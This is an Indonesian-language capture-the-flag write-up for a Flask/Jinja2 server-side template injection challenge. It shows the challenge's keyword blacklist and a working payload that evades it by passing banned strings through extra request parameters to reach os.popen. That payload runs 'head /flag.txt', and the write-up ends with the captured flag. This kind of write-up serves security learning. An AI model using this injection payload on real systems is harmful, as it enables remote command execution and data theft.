# Writeup bebeh ssti - SiebersecCTF

Challenge web ini adalah soal SSTI (Server-Side Template Injection) klasik di Flask/Jinja2. Vulnerability-nya ada di `render_template_string` yang nerima input langsung dari parameter `name`.

## Analisis
Ada blacklist yang cukup rese:
```python
banned = [
    "'", "\"",
    'self', 'cycler', 'globals', 'builtins',
    'os', 'system', 'popen', 'sh', 'cat'
]
```
Karakter kutip (`'` dan `"`) dibanned, jadi kita nggak bisa masukin string langsung. Selain itu, keyword penting buat RCE kayak `globals`, `os`, `popen`, dll juga dibanned. Tapi, pengecekannya cuma dilakuin ke parameter `name`.

## Exploitation
Strategi bypass-nya simpel:
1. Pake `request.args` buat passing string yang dibanned lewat parameter lain.
2. Gunakan `attr` filter buat akses attribute.
3. Karena `.` (titik) kadang bermasalah kalau digabung sama fungsi, kita pake `__getitem__` buat akses dictionary.

Setelah ngulik `lipsum.__globals__`, ternyata modul `os` udah ke-import di sana. Jadi kita tinggal panggil.

Payload final buat baca flag:
```
/?name={{lipsum|attr(request.args.g)|attr(request.args.gi)(request.args.o)|attr(request.args.p)(request.args.c)|attr(request.args.r)()}}&g=__globals__&gi=__getitem__&o=os&p=popen&c=head /flag.txt&r=read
```

Detail parameter:
- `g=__globals__`
- `gi=__getitem__`
- `o=os`
- `p=popen`
- `c=head /flag.txt` (Pake `head` karena `cat` dibanned)
- `r=read`

Flag ketemu di `/flag.txt`.

<FLAG>sctf{h3s_ju5t_4_bebeh}</FLAG>
